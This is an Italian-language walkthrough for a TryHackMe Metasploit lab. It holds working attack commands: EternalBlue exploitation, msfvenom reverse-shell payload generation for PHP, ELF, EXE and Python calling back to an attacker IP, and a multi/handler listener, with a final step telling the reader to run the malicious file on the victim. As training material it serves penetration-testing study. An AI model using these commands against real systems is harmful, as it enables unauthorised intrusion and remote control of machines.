# https://tryhackme.com/room/metasploitexploitation

# Riassunto Laboratorio Metasploit THM

Questa guida serve come riferimento passo-passo per il laboratorio. Seguire l'ordine indicato per completare lo scenario di attacco.

**Nota Importante:**
Per gli attacchi a forza bruta, la wordlist si trova qui:
\`/usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt\`

---

## 1. Setup Iniziale e Workspace
Prima di iniziare la scansione, configuriamo l'ambiente per salvare i risultati nel database.

1.  Avviare la console:
    \`\`\`bash
    msfconsole
    \`\`\`
2.  Verificare lo stato del database:
    \`\`\`bash
    db_status
    \`\`\`
3.  Creare e passare a un nuovo workspace (es. "tryhackme"):
    \`\`\`bash
    workspace -a tryhackme
    \`\`\`
4.  Verificare di essere nel workspace corretto (il nome sarà rosso con un asterisco):
    \`\`\`bash
    workspace
    \`\`\`

---

## 2. Scanning e Enumerazione
Raccogliamo informazioni sul target e popoliamo il database.

### Scansione con Nmap integrato
Eseguire una scansione salvando i risultati direttamente nel DB Metasploit:
\`\`\`bash
db_nmap -sV -p- <TARGET_IP>
\`\`\`

### Analisi dei Risultati
* Visualizzare gli host trovati: \`hosts\`
* Visualizzare i servizi attivi: \`services\`
* Cercare servizi specifici (es. NetBIOS): \`services -S netbios\`

### Scansioni Ausiliarie (Auxiliary Modules)
Utilizzare moduli specifici per approfondire:

* **UDP Sweep** (identificazione rapida servizi UDP):
    \`\`\`bash
    use auxiliary/scanner/discovery/udp_sweep
    run
    \`\`\`
* **SMB & NetBIOS** (ricerca versioni e condivisioni):
    \`\`\`bash
    use auxiliary/scanner/smb/smb_version
    run
    \`\`\`

---

## 3. Exploitation (Scenario: MS17-010 EternalBlue)
Utilizziamo le informazioni raccolte per sfruttare una vulnerabilità SMB.

1.  **Cercare la vulnerabilità:**
    \`\`\`bash
    use auxiliary/scanner/smb/smb_ms17_010
    hosts -R  # Imposta automaticamente RHOSTS dal database
    show options
    run
    \`\`\`
2.  **Preparare l'Exploit:**
    \`\`\`bash
    use exploit/windows/smb/ms17_010_eternalblue
    hosts -R
    set LHOST <TUO_IP_ATTACKBOX>
    \`\`\`
3.  **Selezionare il Payload (Opzionale, se non si vuole il default):**
    \`\`\`bash
    show payloads
    set payload 2 # O il nome completo del payload
    \`\`\`
4.  **Lanciare l'attacco:**
    \`\`\`bash
    exploit
    \`\`\`

### Gestione delle Sessioni
Una volta ottenuto l'accesso:
* Mettere la sessione in background: \`CTRL+Z\`
* Listare le sessioni attive: \`sessions\`
* Interagire con una sessione: \`sessions -i <ID_SESSIONE>\`

---

## 4. Creazione Payload Manuale (Msfvenom)
Generare payload personalizzati per bypassare le restrizioni o per esecuzioni manuali.

### Esempio: Reverse Shell PHP
1.  **Generare il file raw:**
    \`\`\`bash
    msfvenom -p php/reverse_php LHOST=<TUO_IP> LPORT=7777 -f raw > reverse_shell.php
    \`\`\`
2.  **IMPORTANTE - Modifica il file:**
    Aprire \`reverse_shell.php\` con un editor di testo:
    * Rimuovere il commento \`/*\` all'inizio del file (se presente e blocca l'esecuzione).
    * Aggiungere il tag di chiusura \`?>\` alla fine del file.

### Altri formati comuni
* **Linux ELF:** \`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf\`
* **Windows EXE:** \`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe\`
* **Python:** \`msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > shell.py\`

---

## 5. Ricevere la connessione (Multi Handler)
Per far funzionare i payload creati con Msfvenom, serve un listener in ascolto.

1.  Configurare il modulo Generic Handler:
    \`\`\`bash
    use exploit/multi/handler
    \`\`\`
2.  Impostare il payload (DEVE corrispondere a quello usato in Msfvenom):
    \`\`\`bash
    set payload php/reverse_php
    \`\`\`
3.  Configurare IP e Porta:
    \`\`\`bash
    set LHOST <TUO_IP>
    set LPORT 7777
    \`\`\`
4.  Avviare l'ascolto:
    \`\`\`bash
    run
    \`\`\`
    *Ora esegui il file malevolo sulla macchina vittima per ottenere la shell.*